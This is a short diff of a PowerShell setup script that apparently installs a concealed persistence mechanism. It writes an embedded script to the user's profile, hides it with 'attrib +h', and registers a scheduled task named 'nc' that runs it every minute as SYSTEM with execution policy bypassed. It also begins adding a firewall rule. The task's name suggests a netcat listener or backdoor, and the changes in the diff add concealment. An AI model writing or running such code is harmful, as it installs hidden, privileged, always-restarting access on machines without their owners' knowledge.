@@ -63,7 +63,14 @@ if (-not $Process) {
 }
 '@
 
-Set-Content -Path 'C:\script.ps1' -Value $scriptContent
+# Define the script path in the user's folder and store it in a variable
+$scriptPath = "$env:USERPROFILE\script1.ps1"
+
+# Save the script content to the defined path
+Set-Content -Path $scriptPath -Value $scriptContent
+
+# Hide the script using attrib
+attrib +h $scriptPath
 
 # Check if the "nc" task already exists
 if (schtasks /query /tn "nc" 2>$null) {
@@ -71,9 +78,8 @@ if (schtasks /query /tn "nc" 2>$null) {
     schtasks /delete /tn "nc" /f
 }
 
-# Create the task
-& schtasks /create /sc minute /mo 1 /tn "nc" /tr "powershell.exe -ExecutionPolicy Bypass -File `"C:\script.ps1`"" /ru SYSTEM /rl HIGHEST
-
+# Create the task using the script path stored in the variable
+& schtasks /create /sc minute /mo 1 /tn "nc" /tr "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"" /ru SYSTEM /rl HIGHEST
 
 # 5/10: Adding Firewall Rule
 Write-Host "5/10: Adding Firewall Rule..."
